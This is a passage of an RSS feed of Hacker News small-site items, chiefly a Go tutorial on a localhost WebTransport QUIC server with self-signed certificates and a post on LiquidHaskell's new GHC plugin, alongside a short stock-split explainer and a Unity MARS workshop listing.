<p>We will use a linked client example to connect to a server that runs on localhost and uses <a href="https://github.com/lucas-clemente/quic-go">github.com/lucas-clemente/quic-go</a> library. To make our example work we need to open client example in Chrome, and actually, at this moment we need to install Chrome Canary. The reason behind this is that the  <code>quic-go</code> library supports QUIC draft-29 while Chrome &lt; 85 implements QuicTransport over draft-27. If you read this post at a time when Chrome stable 85 already released then most probably you don't need to install Canary release and just use your stable Chrome.</p>
<p>We also need to generate self-signed certificates since WebTransport only works with a TLS layer, and we should make Chrome trust our certificates. Let's prepare our client environment before writing a server and first install Chrome Canary.</p>
<h2 id="install-chrome-canary">Install Chrome Canary<a href="#install-chrome-canary" title="Permanent link">¶</a></h2>
<p>Go to <a href="https://www.google.com/intl/en/chrome/canary/">https://www.google.com/intl/en/chrome/canary/</a>, download and install Chrome Canary. We will use it to open <a href="https://googlechrome.github.io/samples/quictransport/client.html">client example</a>.</p>
<div>
<p>Note</p>
<p>If you have Chrome &gt;= 85 then most probably you can skip this step.</p>
</div>
<h2 id="generate-self-signed-tls-certificates">Generate self-signed TLS certificates<a href="#generate-self-signed-tls-certificates" title="Permanent link">¶</a></h2>
<p>Since WebTransport based on modern network transports like QUIC and HTTP/3 security is a keystone. For our experiment we will create a self-signed TLS certificate using <code>openssl</code>. </p>
<p>Make sure you have <code>openssl</code> installed:</p>
<div><pre><span></span><code>$ which openssl
/usr/bin/openssl
</code></pre></div>

<p>Then run:</p>
<div><pre><span></span><code>openssl genrsa -des3 -passout pass:x -out server.pass.key <span>2048</span>
openssl rsa -passin pass:x -in server.pass.key -out server.key
rm server.pass.key
openssl req -new -key server.key -out server.csr
</code></pre></div>

<p>Set <code>localhost</code> for Common Name when asked.</p>
<p>The self-signed TLS certificate generated from the <code>server.key</code> private key and <code>server.csr</code> files:</p>
<div><pre><span></span><code>openssl x509 -req -sha256 -days <span>365</span> -in server.csr -signkey server.key -out server.crt
</code></pre></div>

<p>After these manipulations you should have <code>server.crt</code> and <code>server.key</code> files in your working directory.</p>
<p>To help you with process here is my console output during these steps (click to open):</p>
<details><summary>My console output generating self-signed certificates</summary><div><pre><span></span><code>$ openssl genrsa -des3 -passout pass:x -out server.pass.key <span>2048</span>
Generating RSA private key, <span>2048</span> bit long modulus
...........................................................................................+++
.....................+++
e is <span>65537</span> <span>(</span>0x10001<span>)</span>

$ ls
server.pass.key

$ openssl rsa -passin pass:x -in server.pass.key -out server.key
writing RSA key

$ ls
server.key      server.pass.key

$ rm server.pass.key

$ openssl req -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span>'.'</span>, the field will be left blank.
-----
Country Name <span>(</span><span>2</span> letter code<span>)</span> <span>[]</span>:RU
State or Province Name <span>(</span>full name<span>)</span> <span>[]</span>:
Locality Name <span>(</span>eg, city<span>)</span> <span>[]</span>:
Organization Name <span>(</span>eg, company<span>)</span> <span>[]</span>:
Organizational Unit Name <span>(</span>eg, section<span>)</span> <span>[]</span>:
Common Name <span>(</span>eg, fully qualified host name<span>)</span> <span>[]</span>:localhost
Email Address <span>[]</span>:

Please enter the following <span>'extra'</span> attributes
to be sent with your certificate request
A challenge password <span>[]</span>:

$ openssl x509 -req -sha256 -days <span>365</span> -in server.csr -signkey server.key -out server.crt
Signature ok
<span>subject</span><span>=</span>/C<span>=</span>RU/CN<span>=</span>localhost
Getting Private key

$ ls
server.crt server.csr server.key
</code></pre></div>

</details>
<h2 id="run-client-example">Run client example<a href="#run-client-example" title="Permanent link">¶</a></h2>
<p>Now the last step. What we need to do is run Chrome Canary with some flags that will allow it to trust our self-signed certificates. I suppose there is an alternative way making Chrome trust your certificates, but I have not tried it.</p>
<p>First let's find out a fingerprint of our cert:</p>
<div><pre><span></span><code>openssl x509 -in server.crt -pubkey -noout <span>|</span> openssl pkey -pubin -outform der <span>|</span> openssl dgst -sha256 -binary <span>|</span> openssl enc -base64
</code></pre></div>

<p>In my case base64 fingerprint was <code>pe2P0fQwecKFMc6kz3+Y5MuVwVwEtGXyST5vJeaOO/M=</code>, yours will be different.</p>
<p>Then run Chrome Canary with some additional flags that will make it trust out certs (close other Chrome Canary instances before running it):</p>
<div><pre><span></span><code>$ /Applications/Google<span>\ </span>Chrome<span>\ </span>Canary.app/Contents/MacOS/Google<span>\ </span>Chrome<span>\ </span>Canary <span>\</span>
    --origin-to-force-quic-on<span>=</span>localhost:4433 <span>\</span>
    --ignore-certificate-errors-spki-list<span>=</span>pe2P0fQwecKFMc6kz3+Y5MuVwVwEtGXyST5vJeaOO/M<span>=</span>
</code></pre></div>

<p>This example is for MacOS, for your system see <a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags">docs on how to run Chrome/Chromium with custom flags</a>.</p>
<p>Now you can open <a href="https://googlechrome.github.io/samples/quictransport/client.html">https://googlechrome.github.io/samples/quictransport/client.html</a> URL in started browser and click <code>Connect</code> button. What? Connection not established? OK, this is fine since we need to run our server :)</p>
<h2 id="writing-a-quic-server">Writing a QUIC server<a href="#writing-a-quic-server" title="Permanent link">¶</a></h2>
<p>Maybe in future we will have libraries that are specified to work with WebTransport over QUIC or HTTP/3, but for now we should implement server manually. As said above we will use <a href="https://github.com/lucas-clemente/quic-go">github.com/lucas-clemente/quic-go</a> library to do this.</p>
<h3 id="server-skeleton">Server skeleton<a href="#server-skeleton" title="Permanent link">¶</a></h3>
<p>First, let's define a simple skeleton for our server:</p>
<div><pre><span></span><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
    <span>"errors"</span>
    <span>"log"</span>

    <span>"github.com/lucas-clemente/quic-go"</span>
<span>)</span>

<span>// Config for WebTransportServerQuic.</span>
<span>type</span> <span>Config</span> <span>struct</span> <span>{</span>
    <span>// ListenAddr sets an address to bind server to.</span>
    <span>ListenAddr</span> <span>string</span>
    <span>// TLSCertPath defines a path to .crt cert file.</span>
    <span>TLSCertPath</span> <span>string</span>
    <span>// TLSKeyPath defines a path to .key cert file</span>
    <span>TLSKeyPath</span> <span>string</span>
    <span>// AllowedOrigins represents list of allowed origins to connect from.</span>
    <span>AllowedOrigins</span> <span>[]</span><span>string</span>
<span>}</span>

<span>// WebTransportServerQuic can handle WebTransport QUIC connections according</span>
<span>// to https://tools.ietf.org/html/draft-vvv-webtransport-quic-02.</span>
<span>type</span> <span>WebTransportServerQuic</span> <span>struct</span> <span>{</span>
    <span>config</span> <span>Config</span>
<span>}</span>

<span>// NewWebTransportServerQuic creates new WebTransportServerQuic.</span>
<span>func</span> <span>NewWebTransportServerQuic</span><span>(</span><span>config</span> <span>Config</span><span>)</span> <span>*</span><span>WebTransportServerQuic</span> <span>{</span>
    <span>return</span> <span>&amp;</span><span>WebTransportServerQuic</span><span>{</span>
        <span>config</span><span>:</span> <span>config</span><span>,</span>
    <span>}</span>
<span>}</span>

<span>// Run server.</span>
<span>func</span> <span>(</span><span>s</span> <span>*</span><span>WebTransportServerQuic</span><span>)</span> <span>Run</span><span>()</span> <span>error</span> <span>{</span>
    <span>return</span> <span>errors</span><span>.</span><span>New</span><span>(</span><span>"not implemented"</span><span>)</span>
<span>}</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
    <span>server</span> <span>:=</span> <span>NewWebTransportServerQuic</span><span>(</span><span>Config</span><span>{</span>
        <span>ListenAddr</span><span>:</span>     <span>"0.0.0.0:4433"</span><span>,</span>
        <span>TLSCertPath</span><span>:</span>    <span>"server.crt"</span><span>,</span>
        <span>TLSKeyPath</span><span>:</span>     <span>"server.key"</span><span>,</span>
        <span>AllowedOrigins</span><span>:</span> <span>[]</span><span>string</span><span>{</span><span>"localhost"</span><span>,</span> <span>"googlechrome.github.io"</span><span>},</span>
    <span>})</span>
    <span>if</span> <span>err</span> <span>:=</span> <span>server</span><span>.</span><span>Run</span><span>();</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>log</span><span>.</span><span>Fatal</span><span>(</span><span>err</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<h3 id="accept-quic-connections">Accept QUIC connections<a href="#accept-quic-connections" title="Permanent link">¶</a></h3>
<p>Let's concentrate on implementing <code>Run</code> method. We need to accept QUIC client connections. This can be done by creating <code>quic.Listener</code> instance and using its <code>.Accept</code> method to accept incoming client sessions.</p>
<div><pre><span></span><code><span>// Run server.</span>
<span>func</span> <span>(</span><span>s</span> <span>*</span><span>WebTransportServerQuic</span><span>)</span> <span>Run</span><span>()</span> <span>error</span> <span>{</span>
    <span>listener</span><span>,</span> <span>err</span> <span>:=</span> <span>quic</span><span>.</span><span>ListenAddr</span><span>(</span><span>s</span><span>.</span><span>config</span><span>.</span><span>ListenAddr</span><span>,</span> <span>s</span><span>.</span><span>generateTLSConfig</span><span>(),</span> <span>nil</span><span>)</span>
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>return</span> <span>err</span>
    <span>}</span>
    <span>for</span> <span>{</span>
        <span>sess</span><span>,</span> <span>err</span> <span>:=</span> <span>listener</span><span>.</span><span>Accept</span><span>(</span><span>context</span><span>.</span><span>Background</span><span>())</span>
        <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
            <span>return</span> <span>err</span>
        <span>}</span>
        <span>log</span><span>.</span><span>Printf</span><span>(</span><span>"session accepted: %s"</span><span>,</span> <span>sess</span><span>.</span><span>RemoteAddr</span><span>().</span><span>String</span><span>())</span>
        <span>go</span> <span>func</span><span>()</span> <span>{</span>
            <span>defer</span> <span>func</span><span>()</span> <span>{</span>
                <span>_</span> <span>=</span> <span>sess</span><span>.</span><span>CloseWithError</span><span>(</span><span>0</span><span>,</span> <span>"bye"</span><span>)</span>
                <span>log</span><span>.</span><span>Println</span><span>(</span><span>"close session"</span><span>)</span>
            <span>}()</span>
            <span>s</span><span>.</span><span>handleSession</span><span>(</span><span>sess</span><span>)</span>
        <span>}()</span>
    <span>}</span>
<span>}</span>

<span>func</span> <span>(</span><span>s</span> <span>*</span><span>WebTransportServerQuic</span><span>)</span> <span>handleSession</span><span>(</span><span>sess</span> <span>quic</span><span>.</span><span>S…</span></code></pre></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://centrifugal.github.io/centrifugo/blog/quic_web_transport/">https://centrifugal.github.io/centrifugo/blog/quic_web_transport/</a></em></p>]]>
            </description>
            <link>https://centrifugal.github.io/centrifugo/blog/quic_web_transport/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273371</guid>
            <pubDate>Tue, 25 Aug 2020 16:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you need to know about the recent stock splits (Tesla/ Apple)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273249">thread link</a>) | @theaveragejoe
<br/>
August 25, 2020 | https://readthejoe.com/articles/the-beauty-of-doing-nothing/ | <a href="https://web.archive.org/web/*/https://readthejoe.com/articles/the-beauty-of-doing-nothing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div id="primary"><main id="main" role="main"><div><p>Equities</p><div> <p><img width="597" height="327" src="https://readthejoe.com/wp-content/uploads/2020/08/Breaking-Bad.gif" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></div><div><p><span>What does a stock split do? It doesn’t do anything… That’s the beauty of it.</span></p><p><span>Tesla ($TSLA)&nbsp;<a href="https://www.cnn.com/2020/08/12/investing/stock-split-apple-tesla/index.html">announced</a>&nbsp;a 5 for 1 split of its stock to be completed on Aug. 31. The move by Tesla follows Apple’s ($AAPL) 4 for 1 stock split announced on Jul. 30.</span></p><p><span><strong>Financial hand waving</strong></span></p><p><span>On Aug. 31, every Tesla stock that you own will turn into 5. What’s the catch? Each stock will be worth a fifth of what it was worth before. Stock splits were massively popular back in the 90s with an average of 64 companies splitting their stock each year. That number dropped to 9 over the past decade.</span></p><p><span>Companies often split their stock to make it more affordable for everyday investors. The invention of fractional shares, the ability to purchase a fraction of a stock, made stock splits redundant. Stock splits cost companies&nbsp;<a href="https://www.marketwatch.com/story/companies-are-weighing-stock-splits-after-tesla-and-apples-announcements-expert-says-11597404072?mod=home-page">~$800,000</a>&nbsp;which makes them even less attractive.</span></p><p><span><strong>Don’t celebrate… or do?</strong></span></p><p><span>Stock splits are mere cosmetics that should not impact stock prices. Turning your five-dollar bill into five one-dollar bills should not make you any wealthier… Unless your bill is manufactured by Elon Musk. Tesla’s stock price increased 17% in the 2 days following the announcement.</span></p><p><span><strong>The lack of science behind stock splits</strong></span></p><p><span>A research study by David Ikenberry, a Professor of Finance at the University of Colorado, revealed stocks that split their shares&nbsp;<a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=7929">outperform</a>&nbsp;the average market return by 7.9% in the year after a stock split.</span></p><p><span>There’s no definitive explanation on why prices go up after stock splits but here are&nbsp;<a href="https://www.marketwatch.com/story/apples-stock-may-beat-the-market-through-2016-2014-06-09">two theories</a>:</span></p><ul><li><span><strong>Theory 1:</strong>&nbsp;Splits are a signal that management expects their stock prices to continue rising.</span></li><li><span><strong>Theory 2</strong>: Investors have a bias in buying stocks with lower prices thinking they have more room to increase.</span></li></ul><p><span><strong>Take no action:</strong>&nbsp;Investors should not solely use stock splits as a reason to buy. They do not fundamentally change anything in a company.</span></p></div></div></main><!-- #main --></div><!-- #primary --></div><!-- .wrap --></div><div><div><div><h3>Investing trends and news sent to your inbox twice a week</h3><p>The 5-minute newsletter that brings you new investment ideas and trends in a bite-sized format</p></div></div></div></div>]]>
            </description>
            <link>https://readthejoe.com/articles/the-beauty-of-doing-nothing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273249</guid>
            <pubDate>Tue, 25 Aug 2020 16:45:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LiquidHaskell Is a GHC Plugin]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273161">thread link</a>) | @Tehnix
<br/>
August 25, 2020 | https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/ | <a href="https://web.archive.org/web/*/https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            <!-- Post Header -->


<!-- Post Content -->
<article>
    <div>
        <div>
            <div>

            <br>

            

            
			            
<p>I enjoy working with LH. However, I’d be the very first to confess that it has been incredibly tedious to get to work on <em>existing</em> code bases, for various reasons.</p>
<ol type="1">
<li><p>LH ran <em>one file at a time</em>; it was a hassle to <strong>systematically analyze</strong> all the modules in a single package.</p></li>
<li><p>LH had <em>no notion of packages</em>; it was impossible to <strong>import specifications</strong> across packages.</p></li>
<li><p>LH had <em>no integration</em> with the standard compilation cycle; it was difficult to get robust, <strong>development-time feedback</strong> using <code>ghci</code> based tools.</p></li>
</ol>
<p>I’m delighted to announce the release of <a href="http://ucsd-progsys.github.io/liquidhaskell/">LH version 0.8.10.2</a>.</p>
<p>Thanks to the ingenuity and tireless efforts of our friends <a href="http://www.alfredodinapoli.com/">Alfredo Di Napoli</a> and <a href="https://www.andres-loeh.de/">Andres Loh</a> at <a href="http://www.well-typed.com/">Well-Typed</a> this new version solves all three of the above problems in a single stroke, making it vastly simpler (dare I say, quite straightforward!) to run LH on your Haskell code.</p>
<!-- more -->
<p>Alfredo and Andres’ key insight was that all the above problems could be solved if LH could be re-engineered as a <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/extending_ghc.html#compiler-plugins">GHC Compiler Plugin</a> using hooks that GHC exposes to integrate external checkers during compilation. I strongly encourage you to check out Alfredo’s talk at the <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">Haskell Implementor’s Workshop</a> if you want to learn more about the rather non-trivial mechanics of how this plugin was engineered. However, in this post, lets look at <em>how</em> and <em>why</em> to use the plugin, in particular, how the plugin lets us</p>
<ol type="1">
<li><p>Use GHC’s dependency resolution to analyze entire packages with minimal recompilation;</p></li>
<li><p>Ship refined type specifications for old or new packages, and have them be verified at client code;</p></li>
<li><p>Use tools like <code>ghci</code> based IDE tooling (e.g.&nbsp;<code>ghcid</code> or <code>ghcide</code> to get interactive feedback),</p></li>
</ol>
<p>all of which ultimately, I hope, make Liquid Haskell easier to use.</p>
<h2 id="analyzing-packages">1. Analyzing Packages</h2>
<p>First, lets see a small “demo” of how to <em>use</em> the plugin to compile a small <a href="https://github.com/ucsd-progsys/lh-plugin-demo"><code>lh-plugin-demo</code></a> package with two modules</p>

<p>which defines a function <code>incr</code> that consumes and returns positive integers, and</p>

<p>which imports <code>Demo.Lib</code> and uses <code>incr</code>.</p>
<h3 id="updating-.cabal-to-compile-with-the-lh-plugin">Updating <code>.cabal</code> to compile with the LH plugin</h3>
<p>To “check” this code with LH we need only tell GHC to use it as a plugin, in two steps.</p>
<ol type="1">
<li>First, adding a dependency to LH in the <code>.cabal</code> file (or <code>package.yaml</code>)</li>
</ol>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell &gt;= 0.8.10</code></pre>
<ol start="2" type="1">
<li>Second, tell GHC to use the plugin</li>
</ol>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>That’s it. Now, everytime you (re-)build the code, GHC will <em>automatically</em> run LH on the changed modules! If you use <code>stack</code> you may have to specify a few more dependencies, as the various packages are not (yet) on stackage, as shown in the <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml">demo <code>stack.yaml</code></a>. No extra dependencies are needede if you use <code>cabal-v2</code>. In both cases, you can use the respective files <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml.github"><code>stack.yaml</code></a> and <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/cabal.project.github"><code>cabal.project</code></a> point to specific git snapshots if you want to use the most recent versions. If you clone the repo and run, e.g.&nbsp;<code>cabal v2-build</code> or <code>stack build</code> you’ll get the following result, after the relevant dependencies are downloaded and built of course…</p>
<pre><code>rjhala@khao-soi ~/r/lh-demo (main)&gt; stack build
lh-plugin-demo&gt; configure (lib)
Configuring lh-plugin-demo-0.1.0.0...
lh-plugin-demo&gt; build (lib)
Preprocessing library for lh-plugin-demo-0.1.0.0..
Building library for lh-plugin-demo-0.1.0.0..
[1 of 2] Compiling Demo.Lib

**** LIQUID: UNSAFE ************************************************************

/Users/rjhala/research/lh-demo/src/Demo/Lib.hs:7:1: error:
    Liquid Type Mismatch
    .
    The inferred type
      VV : {v : GHC.Types.Int | v == x - 1}
    .
    is not a subtype of the required type
      VV : {VV : GHC.Types.Int | 0 &lt; VV}
    .
    in the context
      x : {v : GHC.Types.Int | 0 &lt; v}
  |
7 | incr x = x - 1
  | ^^^^^^^^^^^^^^</code></pre>
<p>oops, of course that <code>(-)</code> should be a <code>(+)</code> if we want the output to also be <em>positive</em> so lets edit the code to</p>

<p>and now we get</p>
<pre><code>rjhala@khao-soi ~/r/lh-plugin-demo (main)&gt; stack build
lh-plugin-demo&gt; configure (lib)
Configuring lh-plugin-demo-0.1.0.0...

lh-plugin-demo&gt; build (lib)
Preprocessing library for lh-plugin-demo-0.1.0.0..
Building library for lh-plugin-demo-0.1.0.0..
[1 of 2] Compiling Demo.Lib

**** LIQUID: SAFE (2 constraints checked) *****************************
[2 of 2] Compiling Demo.Client

**** LIQUID: UNSAFE ***************************************************

/Users/rjhala/lh-plugin-demo/src/Demo/Client.hs:6:15: error:
    Liquid Type Mismatch
    .
    The inferred type
      VV : {v : GHC.Types.Int | v == n}
    .
    is not a subtype of the required type
      VV : {VV : GHC.Types.Int | 0 &lt; VV}
    .
    in the context
      n : GHC.Types.Int
  |
6 | bump n = incr n
  |               ^</code></pre>
<p>That is, during the build, LH complains that <code>incr</code> is being called with a value <code>n</code> that is not strictly positive as required by <code>incr</code>. To fix the code, we can edit it in various ways, e.g.&nbsp;to only call <code>incr</code> if <code>n &gt; 0</code></p>

<p>and now the code builds successfully</p>
<pre><code>rjhala@khao-soi ~/r/lh-plugin-demo (main)&gt; stack build
lh-plugin-demo&gt; configure (lib)
Configuring lh-plugin-demo-0.1.0.0...
lh-plugin-demo&gt; build (lib)
Preprocessing library for lh-plugin-demo-0.1.0.0..
Building library for lh-plugin-demo-0.1.0.0..
[2 of 2] Compiling Demo.Client

**** LIQUID: SAFE (2 constraints checked) ****************************
lh-plugin-demo&gt; copy/register
Installing library in ... 
Registering library for lh-plugin-demo-0.1.0.0..</code></pre>
<h3 id="benefits">Benefits</h3>
<p>There are a couple of benefits to note immediately</p>
<ul>
<li><p>A plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the installing <em>and</em> checking!</p></li>
<li><p>No need to separately <em>install</em> LH; its part of the regular build.</p></li>
<li><p>GHC’s recompilation machinery ensures that only the relevant modules are checked, e.g.&nbsp;the second time round, LH did not need to analyze <code>Lib.hs</code> only <code>Client.hs</code></p></li>
</ul>
<h2 id="shipping-specifications-with-packages">2. Shipping Specifications with Packages</h2>
<p>While the above is nice, in principle it could have been done with some clever <code>makefile</code> trickery (perhaps?). What I’m much more excited about is that now, for the first time, you can <em>ship refinement type specifications within plain Haskell packages</em>.</p>
<p>For example, consider a different <a href="https://github.com/ucsd-progsys/lh-plugin-demo-client">lh-plugin-demo-client</a> package that uses <code>incr</code> from <code>lh-plugin-demo</code>:</p>

<p>Again, the <code>lh-plugin-demo-client.cabal</code> file need only specify the various dependencies:</p>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell,
      lh-plugin-demo</code></pre>
<p>and that GHC should use the plugin</p>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>and lo! a plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the rest.</p>
<pre><code>rjhala@khao-soi ~/r/lh-plugin-demo-client (main)&gt; stack build
lh-plugin-demo-client&gt; configure (lib)
Configuring lh-plugin-demo-client-0.1.0.0...

lh-plugin-demo-client&gt; build (lib)
Preprocessing library for lh-plugin-demo-client-0.1.0.0..
Building library for lh-plugin-demo-client-0.1.0.0..
[1 of 1] Compiling Demo.ExternalClient

**** LIQUID: UNSAFE ****************************************************

/Users/rjhala/lh-plugin-demo-client/src/Demo/ExternalClient.hs:8:22: error:
    Liquid Type Mismatch
    .
    The inferred type
      VV : {v : GHC.Types.Int | v == 0 - n}
    .
    is not a subtype of the required type
      VV : {VV : GHC.Types.Int | VV &gt; 0}
    .
    in the context
      n : GHC.Types.Int
  |
8 |   | otherwise = incr (0 - n)
  |                      ^^^^^^^</code></pre>
<p>(Whoops another off by one error, lets fix it!)</p>

<p>and now all is well</p>
<pre><code>rjhala@khao-soi ~/r/lh-plugin-demo-client (main)&gt; stack build --fast
lh-plugin-demo-client&gt; configure (lib)
Configuring lh-plugin-demo-client-0.1.0.0...
lh-plugin-demo-client&gt; build (lib)
Preprocessing library for lh-plugin-demo-client-0.1.0.0..
Building library for lh-plugin-demo-client-0.1.0.0..
[1 of 1] Compiling Demo.ExternalClient

**** LIQUID: SAFE (3 constraints checked) *****************************

lh-plugin-demo-client&gt; copy/register
Installing library in ... 
Registering library for lh-plugin-demo-client-0.1.0.0..</code></pre>
<h3 id="prelude-specifications">Prelude Specifications</h3>
<p>Did you notice the strange <code>liquid-base</code> dependency in the cabal files?</p>
<p>Previously, LH came installed with a “built-in” set of specifications for various <code>prelude</code> modules. This was <em>hacked</em> inside LH in a rather unfortunate manner, which made these specifications very difficult to extend.</p>
<p>Moving forward, all the refinement specifications e.g.&nbsp;for <code>GHC.List</code> or <code>Data.Vector</code> or <code>Data.Set</code> or <code>Data.Bytestring</code> simply live in packages that <em>mirror</em> the original versions, e.g.&nbsp;<code>liquid-base</code>, <code>liquid-vector</code>, <code>liquid-containers</code>, <code>liquid-bytestring</code>. Each <code>liquid-X</code> package directly <em>re-exports</em> all the contents of the corresponding <code>X</code> package, but with any additional refinement type specifications.</p>
<p>Thus, all the refined types for various prelude operations like <code>(+)</code> or <code>(-)</code> or <code>head</code> and so on, now ship with <code>liquid-base</code> and we add that dependency <strong>instead of</strong> base. Similarly, if you want to verify that <em>your</em> code has no <code>vector</code>-index overflow errors, you simply build with <code>liquid-vector</code> <strong>instead of</strong> <code>vector</code>! Of course, in an ideal, and hopefully not too distant future, we’d directly include the refinement types inside <code>vector</code>, <code>containers</code> or <code>bytestring</code> respectively.</p>
<h3 id="benefits-1">Benefits</h3>
<p>So to recap, the plugin offers several nice benefits with respect to <em>shipping specifications</em></p>
<ul>
<li><p>Refined signatures are bundled together with packages,</p></li>
<li><p>Importing packages with refined signatures automatically ensures those signatures are checked on client code,</p></li>
<li><p>You can (optionally) use refined versions of <code>prelude</code> signatures, and hence, even write refined versions of your favorite <em>custom preludes</em>.</p></li>
</ul>

<p>I saved <em>my</em> favorite part for the end.</p>
<p>What I have enjoyed the most about the plugin is that now (almost) all the GHC-based tools that I use in my regular Haskell development workflow, automatically incorporate LH too! For example, reloading a module in <code>ghci</code> automatically re-runs LH on that file.</p>
<h3 id="ghcid"><code>ghcid</code></h3>
<p>This means, that the mega robust, editor-independent <code>ghcid</code> now automatically produces LH type errors when you save a file. Here’s <code>ghcid</code> running in a terminal.</p>
<figure>
<img src="https://ucsd-progsys.github.io/liquidhaskell-blog/static/img/plugin-ghcid.gif" alt="ghcid"><figcaption>ghcid</figcaption>
</figure>
<h3 id="vscode"><code>vscode</code></h3>
<p>Editor plugins now produce little red squiggles for LH errors too. Here’s <code>code</code> with the <code>Simple GHC (Haskell) Integration</code> plugin</p>
<p><img src="https://ucsd-progsys.github.io/liquidhaskell-blog/static/img/plugin-vscode.gif"></p>
<h3 id="emacs"><code>emacs</code></h3>
<p>H…</p></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/">https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/</a></em></p>]]>
            </description>
            <link>https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273161</guid>
            <pubDate>Tue, 25 Aug 2020 16:37:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unity Mars – Advanced AR Workflows with Andrew Maneri]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273057">thread link</a>) | @barbelldan
<br/>
August 25, 2020 | https://circuitstream.com/workshop/advanced-ar-unity-mars/ | <a href="https://web.archive.org/web/*/https://circuitstream.com/workshop/advanced-ar-unity-mars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <!-- main tag closed in footer.php-->    <main role="main">
                    <div><!-- bs section -->
<section aria-label="Workshop Detail Content" role="region">
    <div>
                <div>
            <div>
	
<div>
    <div>
                <div>
            


<div>
        <div>
        <p>
		        		        03 September 2020		        <span>– 7pm ET</span>            </p>
    </div>
</div>
<div>
    <div>
                    <div title="TextBox Title">
                <p>We've already experienced the fundamentals&nbsp; of Unity MARS. This time we are kicking it up a notch by discovering a true power of MARS workflows.</p><p>Unity Technologies is sending one of their own engineers to show you the way. Andrew Maneri, perceptual engineer at Unity is going to demonstrate advanced workflows inside MARS editor: from creating simulation environments to utilizing landmarks and forces, to scripting new actions and reasoning APIs</p><p>By the end of the workshop, you'll be armed to tackle Unity MARS like a pro.</p><p><strong>Resources:</strong></p><ul><li><em>Presentation slides</em></li></ul><p>Hosted by</p>            </div>
            </div> 
</div>


<div aria-label="author">
    <div>
        
    <div>
                        <figure>
                            <img src="https://cs-wordpress-static-assets.s3.amazonaws.com/uploads/2020/08/andrew_maneri-unity.jpeg" alt="" title="">
                            <figcaption></figcaption>
                            </figure>
                       </div><div><p aria-label="author name">
    <h3 role="heading">Andrew Maneri</h3>
</p>
<p>Perceptual Engineer at Unity Technologies</p>
    </div>
    </div>
</div>
<div>
    <div>
                    <div title="What you will learn">
                <h2>During the workshop, we'll share:</h2><ul><li>Introduction to advanced MARS workflows</li><li>MARS best practices for designers and developers</li><li>How to create simulation environments</li><li>How to utilize landmarks and forces</li><li>How to script new actions</li><li>How to access and use MARS data with Reasoning APIs</li></ul><h2>At the end of the workshop, you'll have:</h2><ul><li>Knowledge of MARS workflows</li><li>A deeper understanding of how simulation works</li><li>Knowledge how to script and utilize MARS data</li><li>Answers to your questions about MARS development</li></ul><h2>Workshop prerequisites</h2><ul><li>Downloaded Unity 2019.3 or newer (optional)</li><li>Installed MARS (free for 45 days) (optional)</li><li>AR headset is not needed</li></ul><h2>About Your Instructor:</h2><p>Andrew Maneri has been working with Unity Labs since 2015 to pioneer the future of XR interaction. He has been a technical Lead on Unity Project MARS.</p>            </div>
            </div> 
</div>
        </div>
            </div>
</div>


</div>
        </div>
            </div>
</section>


<!-- bs section -->
<section aria-label="Our Partners" role="region">
    
</section>


</div>
            </main>
</div></div>]]>
            </description>
            <link>https://circuitstream.com/workshop/advanced-ar-unity-mars/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273057</guid>
            <pubDate>Tue, 25 Aug 2020 16:28:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to achieve career growth: opportunities, skills and sponsors]]>
            </title>
            <description>
<![CDATA[
